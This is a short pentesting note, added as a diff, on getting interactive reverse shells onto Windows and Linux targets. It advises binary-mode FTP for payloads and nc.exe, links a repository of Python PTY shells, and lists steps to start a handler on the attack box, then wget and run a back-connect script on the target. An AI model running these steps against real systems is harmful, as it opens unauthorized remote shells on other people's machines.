@@ -1,0 +1,14 @@
+Windows & Linux
+WHEN MOVING FILES IN FTP, set to binary mode to in order to not mess up a payload or nc.exe 
+
+
+
+Linux 
+https://github.com/infodox/python-pty-shells
+Use these to create fully interactive shells 
+
+On attack box 
+shell_handler -b IP PORT
+
+On target box, wget the file, then execute 
+python backconnect.py
